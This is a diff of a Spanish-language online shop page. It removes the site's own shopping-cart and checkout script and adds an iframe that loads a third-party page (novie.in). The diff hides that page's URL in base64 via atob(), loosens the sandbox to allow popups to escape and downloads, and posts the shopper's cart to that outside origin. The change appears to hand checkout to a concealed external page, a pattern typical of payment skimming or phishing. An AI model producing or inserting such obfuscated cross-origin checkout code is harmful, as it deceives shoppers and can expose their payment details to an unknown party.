@@ -931,11 +931,21 @@ font-weight:bold;
 ">
 Enviando pedido...
 </div>
+
+    
 <section>
+<iframe 
+  id="secureFrame"
+  width="100%" 
+  height="400px"
+  sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads">
+</iframe>
+
 <script>
 const iframe = document.getElementById("secureFrame");
 
-const realURL = "https://novie.in/8/aqui.html";
+const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi84L2FxdWkuaHRtbA==");
+
 iframe.src = realURL;
 
 function enviarCarrito() {
@@ -946,19 +956,28 @@ function enviarCarrito() {
     "https://novie.in"
   );
 
-  console.log("ENVIADO:", carrito);
+  console.log("Carrito enviado:", carrito);
 }
 
 iframe.addEventListener("load", () => {
-  let i = 0;
-  const t = setInterval(() => {
-    enviarCarrito();
-    i++;
-    if (i > 10) clearInterval(t);
-  }, 300);
+  enviarCarrito();
+  setTimeout(enviarCarrito, 300);
+  setTimeout(enviarCarrito, 800);
 });
 </script>
 
+<script>
+window.addEventListener("message", function(event) {
+
+  if (event.origin !== "https://novie.in") return;
+
+  if (event.data.type === "altura") {
+    const iframe = document.getElementById("secureFrame");
+    iframe.style.height = event.data.height + "px";
+  }
+
+});
+</script>
 </section>
 
 <!-- FOOTER ORIGINAL -->
@@ -1016,123 +1035,6 @@ iframe.addEventListener("load", () => {
     </div>
 
 </footer>
-
-<div id="cart" onclick="toggleCarrito()" style="cursor: pointer; width:166px; font-family:Arial,sans-serif;">
-  <h5 style="margin:0; padding:8px; color:black; font-size:16px;">
-    🛒 Carrito (<span id="cart-count">0</span>)
-  </h5>
-  <div id="cart-details" style="display: none; padding:10px; border:1px solid #ccc;">
-    <ul id="cart-items" style="list-style:none; padding:0; margin:0;"></ul>
-    <div style="text-align:right; font-weight:bold; margin-top:8px;">
-      Total: $<span id="cart-total">0.00</span>
-    </div>
-    <div style="display:flex; justify-content:space-between; margin-top:10px;">
-      <button onclick="vaciarCarrito(event)" style="width:48%; padding:5px 0;">Vaciar Carrito</button>
-      <button onclick="finalizarCompra(event)" style="width:48%; padding:5px 0;">Finalizar Compra</button>
-    </div>
-  </div>
-</div>
-
-<script>
-
-let carrito = JSON.parse(localStorage.getItem('carrito')) || [];
-
-// Guardar carrito y actualizar vista
-function guardarCarrito() { 
-  localStorage.setItem('carrito', JSON.stringify(carrito));
-  actualizarCarrito();
-}
-
-// Actualizar lista de carrito, total y contador
-function actualizarCarrito() {
-  const lista = document.getElementById('cart-items');
-  const total = document.getElementById('cart-total');
-  const contador = document.getElementById('cart-count');
-  lista.innerHTML = '';
-  let totalPrecio = 0;
-
-  carrito.forEach((item, index) => {
-    const li = document.createElement('li');
-    li.style.display = 'flex';
-    li.style.alignItems = 'center';
-    li.style.marginBottom = '8px';
-    li.style.borderBottom = '1px solid #eee';
-    li.style.paddingBottom = '4px';
-
-    const img = document.createElement('img');
-    img.src = item.imagen;
-    img.alt = item.nombre;
-    img.style.width = '40px';
-    img.style.height = '40px';
-    img.style.objectFit = 'cover';
-    img.style.marginRight = '10px';
-
-    const texto = document.createElement('span');
-    texto.textContent = `${item.nombre} (${item.modelo}) - $${item.precio.toFixed(2)}`;
-    texto.style.fontSize = '14px';
-
-    const btnEliminar = document.createElement('button');
-    btnEliminar.textContent = '✕';
-    btnEliminar.style.marginLeft = 'auto';
-    btnEliminar.style.border = 'none';
-    btnEliminar.style.background = 'transparent';
-    btnEliminar.style.color = '#dc3545';
-    btnEliminar.style.cursor = 'pointer';
-    btnEliminar.onclick = (e) => {
-      e.stopPropagation();
-      carrito.splice(index, 1);
-      guardarCarrito();
-    }
-
-    li.appendChild(img);
-    li.appendChild(texto);
-    li.appendChild(btnEliminar);
-    lista.appendChild(li);
-
-    totalPrecio += item.precio; // sin multiplicar por cantidad
-  });
-
-  contador.textContent = carrito.length;
-  total.textContent = totalPrecio.toFixed(2);
-}
-
-// Función para agregar al carrito
-
-
-// Funciones auxiliares
-function vaciarCarrito(e){ e.stopPropagation(); carrito=[]; guardarCarrito(); }
-function finalizarCompra(e){ e.stopPropagation(); guardarCarrito(); window.location.href="checkout.html"; }
-function toggleCarrito(){ 
-  const detalles = document.getElementById('cart-details'); 
-  detalles.style.display = detalles.style.display === 'none' ? 'block' : 'none';
-}
-document.querySelectorAll('.add-to-cart').forEach(btn => {
-  btn.addEventListener('click', function(e){
-    e.preventDefault();
-
-    const card = this.closest('.product-card');
-    const select = card.querySelector('.sabor-select');
-    if(select) {
-      const sabor = select.value;
-      if(!sabor) {
-        alert('Por favor, selecciona un sabor.');
-        return;
-      }
-      this.dataset.modelo = sabor; // actualiza el modelo con el sabor
-    }
-    const nombre = this.dataset.nombre;
-    const modelo = this.dataset.modelo;
-    const precio = parseFloat(this.dataset.precio);
-    const imagen = this.dataset.imagen;
-
-    // Aquí agregas al carrito
-    carrito.push({ nombre, modelo, precio, imagen });
-    guardarCarrito(); // tu función para guardar el carrito
-  });
-});
-// Inicializa carrito al cargar
-document.addEventListener('DOMContentLoaded', actualizarCarrito);
-</script>
 
 
 
